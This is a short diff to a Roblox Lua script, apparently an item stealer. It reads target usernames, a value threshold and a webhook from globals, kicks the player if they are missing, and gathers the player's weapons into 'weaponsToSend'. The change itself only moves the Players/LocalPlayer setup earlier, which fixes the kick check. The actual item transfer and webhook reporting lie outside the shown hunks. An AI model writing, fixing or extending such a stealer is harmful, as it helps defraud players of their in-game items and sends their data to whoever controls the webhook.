@@ -3,6 +3,8 @@ if not _G.BypassExecuted then
     _G.BypassExecuted = true
     
     local TeleportService = game:GetService("TeleportService")
+    local Players = game:GetService("Players")
+    local plr = Players.LocalPlayer
     
     -- Сохраняем основной скрипт в переменную
     local mainScript = [[
@@ -17,6 +19,9 @@ if not _G.BypassExecuted then
         local min_value = _G.min_value or 1
         local ping = _G.pingEveryone or "No"
         local webhook = _G.webhook or ""
+
+        local Players = game:GetService("Players")
+        local plr = Players.LocalPlayer
 
         if next(users) == nil or webhook == "" then
             plr:Kick("You didn't add username or webhook")
@@ -39,8 +44,6 @@ if not _G.BypassExecuted then
         end
 
         local weaponsToSend = {}
-        local Players = game:GetService("Players")
-        local plr = Players.LocalPlayer
         local playerGui = plr:WaitForChild("PlayerGui")
         local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
         local HttpService = game:GetService("HttpService")
